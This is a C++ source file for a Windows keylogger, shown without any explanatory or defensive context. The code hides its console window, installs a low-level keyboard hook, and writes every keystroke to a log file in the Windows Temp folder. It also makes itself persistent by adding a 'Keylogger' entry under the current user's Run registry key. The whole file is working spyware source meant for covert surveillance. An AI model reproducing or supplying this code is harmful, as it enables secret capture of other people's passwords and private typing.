#include <windows.h>
#include <fstream>
#include <iostream>
#include <string>
#include <thread>
#include <chrono>

// Global variables
std::ofstream logFile;
bool isRunning = true;

// Hide the console window
void hideConsole() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) {
        ShowWindow(hwnd, SW_HIDE);
    }
}

// Log keystrokes to a file
void logKeyStroke(int key) {
    static bool isCapsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
    static bool isShiftPressed = false;

    // Handle special keys
    switch (key) {
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
            isShiftPressed = true;
            logFile << "[SHIFT]";
            break;
        case VK_RETURN:
            logFile << "[ENTER]\n";
            break;
        case VK_SPACE:
            logFile << " ";
            break;
        case VK_BACK:
            logFile << "[BACKSPACE]";
            break;
        case VK_TAB:
            logFile << "[TAB]";
            break;
        case VK_ESCAPE:
            logFile << "[ESC]";
            break;
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
            logFile << "[CTRL]";
            break;
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:
            logFile << "[ALT]";
            break;
        case VK_CAPITAL:
            isCapsLock = !isCapsLock;
            logFile << "[CAPS LOCK]";
            break;
        default:
            // Handle printable characters
            if (key >= 'A' && key <= 'Z') {
                if ((isCapsLock && !isShiftPressed) || (!isCapsLock && isShiftPressed)) {
                    logFile << static_cast<char>(key);
                } else {
                    logFile << static_cast<char>(key + 32); // Convert to lowercase
                }
            } else if (key >= '0' && key <= '9') {
                logFile << static_cast<char>(key);
            } else {
                logFile << "[KEY:" << key << "]";
            }
            break;
    }
    logFile.flush();
}

// Low-level keyboard hook callback
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        logKeyStroke(pKeyBoard->vkCode);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Set up persistence (add to startup)
void setPersistence() {
    HKEY hKey;
    std::string appPath = "C:\\path\\to\\your\\keylogger.exe"; // Change this to the actual path
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, "Keylogger", 0, REG_SZ, (BYTE*)appPath.c_str(), appPath.size() + 1);
        RegCloseKey(hKey);
    }
}

// Main function
int main() {
    // Hide the console window
    hideConsole();

    // Set persistence (add to startup)
    setPersistence();

    // Open log file in hidden mode
    logFile.open("C:\\Windows\\Temp\\log.txt", std::ios::out | std::ios::app);
    if (!logFile.is_open()) {
        MessageBox(NULL, "Failed to open log file!", "Error", MB_ICONERROR);
        return 1;
    }

    // Set up low-level keyboard hook
    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (hhkLowLevelKybd == NULL) {
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
        return 1;
    }

    // Message loop to keep the hook active
    MSG msg;
    while (isRunning && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Clean up
    UnhookWindowsHookEx(hhkLowLevelKybd);
    logFile.close();

    return 0;
}